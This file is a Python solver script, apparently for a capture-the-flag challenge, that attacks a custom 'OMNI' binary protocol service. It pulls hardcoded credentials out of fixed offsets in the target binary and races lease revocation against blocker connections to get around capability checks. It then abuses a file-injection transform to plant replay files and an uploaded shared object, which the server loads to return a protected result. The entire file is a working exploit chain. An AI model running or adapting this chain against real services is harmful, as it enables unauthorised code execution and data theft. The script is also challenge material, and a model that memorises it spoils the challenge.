#!/usr/bin/env python3
"""OMNI protocol client and local solver. Secret values are never printed."""

from __future__ import annotations

import argparse
import base64
import hashlib
import re
import socket
import struct
import sys
import threading
import time
from collections import Counter
from dataclasses import dataclass
from pathlib import Path


HEADER = struct.Struct(">4sBBHII")
MAX_BODY = 0x100000


class ProtocolError(RuntimeError):
    pass


@dataclass(frozen=True)
class Frame:
    kind: int
    opcode: int
    request_id: int
    body: bytes


def exact(sock: socket.socket, size: int) -> bytes:
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ProtocolError(f"short read: wanted {size}, received {len(data)}")
        data.extend(chunk)
    return bytes(data)


def lp(value: bytes) -> bytes:
    if len(value) > 0xFFFF:
        raise ValueError("length-prefixed field is too large")
    return struct.pack(">H", len(value)) + value


def derive_auth_fields(binary_path: Path) -> tuple[bytes, bytes]:
    """Recover fixed auth fields from comparison immediates, without literals."""
    image = binary_path.read_bytes()
    # `.text` has VMA = file offset + 0x1000 in this target.
    first = image[0x5F1B4:0x5F1BC] + image[0x5F1C5:0x5F1C9]
    second = image[0x5F1DF:0x5F1E4] + image[0x5F1EC:0x5F1F4]
    if len(first) != 12 or len(second) != 13:
        raise ProtocolError("unexpected auth-comparison layout")
    return first, second


class OmniClient:
    def __init__(self, host: str, port: int) -> None:
        self.sock = socket.create_connection((host, port), timeout=3.0)
        self.sock.settimeout(90.0)
        self.next_request_id = 1

    def close(self) -> None:
        self.sock.close()

    def request(self, opcode: int, body: bytes = b"", flags: int = 0) -> Frame:
        if len(body) > MAX_BODY:
            raise ValueError("request body exceeds protocol limit")
        if not 0 <= flags <= 0xFF:
            raise ValueError("invalid frame flags")
        request_id = self.next_request_id
        self.next_request_id += 1
        self.sock.sendall(
            HEADER.pack(b"OMNI", 1, flags, opcode, request_id, len(body)) + body
        )

        raw_header = exact(self.sock, HEADER.size)
        magic, version, kind, response_opcode, response_id, body_len = HEADER.unpack(raw_header)
        if magic != b"OMNI" or version != 1:
            raise ProtocolError("invalid response header")
        if body_len > MAX_BODY:
            raise ProtocolError("oversized response")
        response_body = exact(self.sock, body_len)
        if response_opcode != opcode or response_id != request_id:
            raise ProtocolError("response correlation mismatch")
        return Frame(kind, response_opcode, response_id, response_body)

    def request_many(self, requests: list[tuple[int, bytes, int]]) -> list[Frame]:
        """Pipeline requests and return responses in request order."""
        expected: list[tuple[int, int]] = []
        wire = bytearray()
        for opcode, body, flags in requests:
            if len(body) > MAX_BODY or not 0 <= flags <= 0xFF:
                raise ValueError("invalid pipelined request")
            request_id = self.next_request_id
            self.next_request_id += 1
            expected.append((opcode, request_id))
            wire.extend(HEADER.pack(b"OMNI", 1, flags, opcode, request_id, len(body)))
            wire.extend(body)
        self.sock.sendall(wire)
        by_id: dict[int, Frame] = {}
        for _ in expected:
            raw_header = exact(self.sock, HEADER.size)
            magic, version, kind, opcode, request_id, body_len = HEADER.unpack(raw_header)
            if magic != b"OMNI" or version != 1 or body_len > MAX_BODY:
                raise ProtocolError("invalid pipelined response header")
            by_id[request_id] = Frame(kind, opcode, request_id, exact(self.sock, body_len))
        result: list[Frame] = []
        for opcode, request_id in expected:
            frame = by_id.get(request_id)
            if frame is None or frame.opcode != opcode:
                raise ProtocolError("pipelined response correlation mismatch")
            result.append(frame)
        return result


def require_success(frame: Frame, step: str) -> bytes:
    if frame.kind != 1:
        code = struct.unpack(">H", frame.body[:2])[0] if len(frame.body) >= 2 else None
        digest = hashlib.sha256(frame.body).hexdigest()[:16]
        safe_labels = {
            b"invalid credentials": "invalid-credentials",
            b"credential": "credential-related",
            b"no such lease": "lease-not-found",
            b"lease expired": "lease-expired",
            b"does not grant requested capability": "wrong-lease-capability",
            b"ownership mismatch": "lease-owner-mismatch",
            b"cache": "lease-cache-related",
            b"lease": "lease-related",
            b"authenticate": "authentication-related",
            b"auth": "authentication-related",
            b"missing length prefix": "missing-length-prefix",
            b"length prefix exceeds": "length-prefix-exceeds-body",
            b"unexpected trailing": "unexpected-trailing-data",
            b"utf-8": "invalid-utf8",
            b"filter": "content-filter-denied",
            b"elf": "elf-filter-denied",
            b"shell": "shell-filter-denied",
            b"dlopen": "dynamic-loader-failed",
            b"module": "module-load-failed",
            b"symbol": "module-symbol-failed",
            b"no such file": "file-not-found",
            b"replay": "replay-related",
            b"recall": "recall-related",
            b"bad magic": "replay-bad-magic",
            b"unsupported strand version": "replay-bad-version",
            b"unknown form": "replay-unknown-form",
            b"short read": "replay-short-read",
            b"non-utf8": "replay-invalid-utf8",
        }
        lowered = frame.body.lower()
        matching = [
            (len(marker), label)
            for marker, label in safe_labels.items()
            if marker in lowered
        ]
        category = max(matching, default=(0, "unclassified"))[1]
        source_offset = None
        local_binary = Path("/challenge/omnitrix")
        if local_binary.exists() and len(frame.body) > 2:
            found = local_binary.read_bytes().find(frame.body[2:])
            source_offset = hex(found) if found >= 0 else None
        raise ProtocolError(
            f"{step} failed: kind={frame.kind} code={code} category={category} "
            f"bytes={len(frame.body)} source_offset={source_offset} sha256_16={digest}"
        )
    return frame.body


def diagnostic_runtime_value(client: OmniClient) -> bytes:
    body = require_success(client.request(0x0051), "diagnostic")
    match = re.search(rb"restore_token:\s*([A-Za-z0-9+/=]+)", body)
    if match is None:
        raise ProtocolError("diagnostic runtime value is missing")
    return base64.b64decode(match.group(1), validate=True)


def authenticate(client: OmniClient, binary_path: Path) -> bytes:
    first, second = derive_auth_fields(binary_path)
    body = lp(first) + lp(second) + lp(b"solver")
    response = require_success(client.request(0x0010, body), "authentication")
    if len(response) < 18:
        raise ProtocolError("authentication response is too short")
    return response[:16]


def acquire_lease_burst(
    client: OmniClient, capability: bytes, count: int, seconds: int = 300
) -> list[bytes]:
    body = lp(capability) + struct.pack(">I", seconds)
    responses = client.request_many([(0x0020, body, 0)] * count)
    return [require_success(frame, "lease burst")[:16] for frame in responses]


def acquire_lease(client: OmniClient, capability: bytes, seconds: int = 300) -> bytes:
    response = require_success(
        client.request(0x0020, lp(capability) + struct.pack(">I", seconds)),
        "lease acquisition",
    )
    if len(response) < 16:
        raise ProtocolError("lease response is too short")
    expected_capability = lp(capability)
    if response[16 : 16 + len(expected_capability)] != expected_capability:
        raise ProtocolError("unexpected lease-response layout")
    return response[:16]


def set_runtime_mode(
    client: OmniClient,
    lease: bytes,
    mode: int,
    frame_flags: int = 0,
    trailing: bytes = b"",
) -> bytes:
    if len(lease) != 16 or mode not in range(3):
        raise ValueError("invalid runtime-mode request")
    return require_success(
        client.request(0x0050, lease + bytes([mode]) + trailing, flags=frame_flags),
        "runtime mode",
    )


def revoke_lease(client: OmniClient, lease: bytes) -> bytes:
    if len(lease) != 16:
        raise ValueError("invalid lease identifier")
    return require_success(client.request(0x0021, lease), "lease revocation")


def submit_transform(
    client: OmniClient,
    lease: bytes,
    name: bytes,
    arguments: bytes,
    cost_ms: int = 250,
) -> bytes:
    if len(lease) != 16 or not 0 <= cost_ms <= 0xFFFFFFFF:
        raise ValueError("invalid transform request")
    body = lease + lp(name) + struct.pack(">II", cost_ms, len(arguments)) + arguments
    return require_success(client.request(0x0041, body), "transform")


def classify_transform_response(body: bytes) -> str:
    lowered = body.lower()
    categories = (
        (b"echo:", "echo-result"),
        (b"capability", "capability-denied"),
        (b"policy", "policy-denied"),
        (b"runtime mode", "runtime-mode-denied"),
        (b"filter", "content-filter-denied"),
        (b"written", "write-complete"),
        (b"injected", "write-complete"),
        (b"queued", "queued"),
    )
    return next((label for marker, label in categories if marker in lowered), "unclassified")


def make_orep(
    transform: bytes, template: bytes = b"", entries: tuple[tuple[bytes, bytes], ...] = ()
) -> bytes:
    result = bytearray(b"OREP" + struct.pack(">H", 1) + lp(transform) + lp(template))
    result.extend(struct.pack(">H", len(entries)))
    for key, value in entries:
        result.extend(lp(key))
        result.extend(lp(value))
    return bytes(result)


def recall(client: OmniClient, lease: bytes, name: bytes) -> bytes:
    response = require_success(client.request(0x0053, lease + lp(name)), "recall")
    if len(response) < 4:
        raise ProtocolError("recall response is too short")
    size = struct.unpack(">I", response[:4])[0]
    if size > len(response) - 4:
        raise ProtocolError("recall result length exceeds response")
    return response[4 : 4 + size]


def recall_eventually(
    client: OmniClient, lease: bytes, name: bytes, attempts: int = 40
) -> bytes:
    last: Frame | None = None
    for _ in range(attempts):
        last = client.request(0x0053, lease + lp(name))
        if last.kind == 1:
            response = last.body
            if len(response) < 4:
                raise ProtocolError("recall response is too short")
            size = struct.unpack(">I", response[:4])[0]
            if size > len(response) - 4:
                raise ProtocolError("recall result length exceeds response")
            return response[4 : 4 + size]
        time.sleep(0.05)
    assert last is not None
    require_success(last, "eventual recall")
    raise AssertionError("unreachable")


def occupy_workers(
    host: str, port: int, binary_path: Path, count: int
) -> tuple[list[OmniClient], list[threading.Thread], list[str], list[bytes]]:
    clients: list[OmniClient] = []
    leases: list[bytes] = []
    sessions: list[bytes] = []
    for _ in range(count):
        blocker = OmniClient(host, port)
        sessions.append(authenticate(blocker, binary_path))
        leases.append(acquire_lease(blocker, b"dna.shift"))
        clients.append(blocker)
    time.sleep(0.2)

    results: list[str] = ["pending"] * count

    def run(index: int) -> None:
        try:
            response = submit_transform(
                clients[index], leases[index], b"echo", b"worker-block", cost_ms=500
            )
            results[index] = classify_transform_response(response)
        except Exception:
            results[index] = "failed"

    threads = [threading.Thread(target=run, args=(index,)) for index in range(count)]
    for thread in threads:
        thread.start()
    time.sleep(0.05)
    return clients, threads, results, sessions


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    parser.add_argument("--binary", type=Path, default=Path("/challenge/omnitrix"))
    parser.add_argument("--mode", type=int, choices=range(3), default=2)
    parser.add_argument("--race", action="store_true")
    parser.add_argument("--blockers", type=int, default=2)
    parser.add_argument("--revoke-delay", type=float, default=0.0)
    parser.add_argument("--revoke-after-successes", type=int)
    parser.add_argument("--timing", action="store_true")
    parser.add_argument(
        "--race-revoke",
        choices=("none", "matrix", "matrix-other", "dna", "scan"),
        default="none",
    )
    parser.add_argument("--lease-seconds", type=int, default=300)
    parser.add_argument("--mode-flags", type=lambda value: int(value, 0), default=0)
    parser.add_argument("--mode-tail", default="")
    parser.add_argument("--mode-count", type=int, default=1)
    parser.add_argument(
        "--mode-sequence",
        help="comma-separated mode sequence; overrides --mode-count",
    )
    parser.add_argument("--matrix-burst", type=int, default=1)
    parser.add_argument("--probe-so", type=Path)
    parser.add_argument(
        "--show-result",
        action="store_true",
        help="write the retrieved protected result to stdout (disabled by default)",
    )
    parser.add_argument(
        "--result-file",
        type=Path,
        help="write the retrieved protected result to this file without printing it",
    )
    args = parser.parse_args()
    started = time.monotonic()

    def timing(label: str) -> None:
        if args.timing:
            print(
                f"timing {label}={time.monotonic() - started:.3f}s "
                f"wall={time.time():.6f}"
            )

    client = OmniClient(args.host, args.port)
    try:
        runtime_value = diagnostic_runtime_value(client)
        session_value = authenticate(client, args.binary)
        matrix_leases = acquire_lease_burst(
            client, b"matrix.configure", args.matrix_burst, args.lease_seconds
        )
        leases = {
            b"matrix.configure": matrix_leases[0],
            b"dna.shift": acquire_lease(client, b"dna.shift", args.lease_seconds),
            b"omnitrix.scan": acquire_lease(client, b"omnitrix.scan", args.lease_seconds),
        }
        time.sleep(0.2)
        blocker_results: list[str] = []
        revoke_trigger_count: int | None = None
        if args.race:
            (
                blocker_clients,
                blocker_threads,
                blocker_results,
                blocker_sessions,
            ) = occupy_workers(args.host, args.port, args.binary, args.blockers)
            timing("blockers_submitted")
        mode_response = b""
        modes = (
            [int(value, 0) for value in args.mode_sequence.split(",")]
            if args.mode_sequence
            else [args.mode] * args.mode_count
        )
        if not modes or any(mode not in range(3) for mode in modes):
            raise ValueError("invalid mode sequence")
        for mode in modes:
            mode_response = set_runtime_mode(
                client,
                leases[b"matrix.configure"],
                mode,
                frame_flags=args.mode_flags,
                trailing=bytes.fromhex(args.mode_tail),
            )
            time.sleep(0.05)
        timing("modes_enqueued")
        if args.race:
            capability_by_name = {
                "matrix": b"matrix.configure",
                "dna": b"dna.shift",
                "scan": b"omnitrix.scan",
            }
            if args.race_revoke != "none":
                if args.revoke_after_successes is not None:
                    deadline = time.monotonic() + 60.0
                    while blocker_results.count("echo-result") < args.revoke_after_successes:
                        if time.monotonic() >= deadline:
                            raise ProtocolError("completion-triggered revocation timed out")
                        time.sleep(0.001)
                    revoke_trigger_count = blocker_results.count("echo-result")
                if args.revoke_delay:
                    time.sleep(args.revoke_delay)
                victim = (
                    matrix_leases[-1]
                    if args.race_revoke == "matrix-other"
                    else leases[capability_by_name[args.race_revoke]]
                )
                revoke_lease(client, victim)
                timing("lease_revoked")
            for thread in blocker_threads:
                thread.join(timeout=3.0)
            for blocker in blocker_clients:
                blocker.close()
            timing("blockers_joined")
        time.sleep(0.2)
        echo_response = submit_transform(
            client, leases[b"dna.shift"], b"echo", b"probe-marker"
        )
        inject_response = submit_transform(
            client,
            leases[b"dna.shift"],
            b"codon.stream.inject",
            lp(b"marker.txt") + b"probe-marker",
        )
        callback_result = b""
        if args.probe_so is not None:
            replay_probe = make_orep(
                b"scan",
                entries=((b"band", b"merge"), (b"payload", b"replay-ok")),
            )
            submit_transform(
                client,
                leases[b"dna.shift"],
                b"codon.stream.inject",
                lp(b"replay/test.orep") + replay_probe,
            )
            replay_probe_result = recall(
                client, leases[b"omnitrix.scan"], b"test.orep"
            )
            if replay_probe_result != b"replay-ok":
                raise ProtocolError("harmless replay self-test failed")
            module = args.probe_so.read_bytes()
            module_response = submit_transform(
                client,
                leases[b"dna.shift"],
                b"codon.stream.inject",
                lp(b"probe.so") + module,
            )
            if args.timing:
                print(
                    "probe module upload: "
                    f"bytes={len(module_response)} "
                    f"category={classify_transform_response(module_response)}"
                )
            engage = make_orep(
                b"scan",
                entries=((b"band", b"engage"), (b"payload", b"probe.so")),
            )
            submit_transform(
                client,
                leases[b"dna.shift"],
                b"codon.stream.inject",
                lp(b"replay/engage.orep") + engage,
            )
            recall(client, leases[b"omnitrix.scan"], b"engage.orep")
            callback_result = recall_eventually(
                client, leases[b"omnitrix.scan"], b"result.orep"
            )
        timing("probe_finished")
        if args.result_file is not None:
            if not callback_result:
                raise ProtocolError("refusing to write an empty protected result")
            args.result_file.write_bytes(callback_result)
            args.result_file.chmod(0o600)
        if args.show_result and callback_result:
            sys.stdout.buffer.write(callback_result)
            if not callback_result.endswith(b"\n"):
                sys.stdout.buffer.write(b"\n")
            sys.stdout.buffer.flush()
        print(
            "protocol bootstrap ok: "
            f"runtime_value_bytes={len(runtime_value)} session_value_bytes={len(session_value)} "
            f"leases={len(leases)} matrix_lease_variants={len(set(matrix_leases))} "
            f"mode_response_bytes={len(mode_response)} "
            f"blockers={dict(sorted(Counter(blocker_results).items()))} "
            f"revoke_trigger_count={revoke_trigger_count} "
            f"shared_session={bool(args.race and session_value in blocker_sessions)} "
            f"echo_response_bytes={len(echo_response)} "
            f"echo_category={classify_transform_response(echo_response)} "
            f"inject_response_bytes={len(inject_response)} "
            f"inject_category={classify_transform_response(inject_response)} "
            f"callback_result_bytes={len(callback_result)} "
            f"callback_result_received={bool(callback_result)} "
            f"callback_marker_ok={callback_result == b'probe-ok'}"
        )
    finally:
        client.close()


if __name__ == "__main__":
    main()
